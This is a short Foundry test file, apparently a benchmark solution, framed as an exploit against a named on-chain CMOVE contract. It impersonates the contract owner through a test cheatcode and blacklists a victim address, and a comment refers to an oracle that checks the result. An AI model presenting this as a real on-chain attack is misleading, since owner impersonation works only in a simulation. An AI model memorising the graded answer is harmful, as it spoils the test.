pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICMOVE {
    function owner() external view returns (address);
    function addBlackList(address add) external;
    function blackListedList(address) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xdfFF8a26e4112945D9a850d63F1a864595fCbFE6;
    address attacker = address(this);
    address victim = address(0x1234567890123456789012345678901234567890);
    ICMOVE cmove;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        cmove = ICMOVE(TARGET);
        vm.label(TARGET, "CMOVE Contract");
        vm.label(victim, "Victim");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the owner address
        address owner = cmove.owner();
        vm.label(owner, "Owner");

        // Impersonate the owner and blacklist the victim
        vm.startPrank(owner);
        cmove.addBlackList(victim);
        vm.stopPrank();

        // The oracle will verify blackListedList[victim] == true via storage check
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

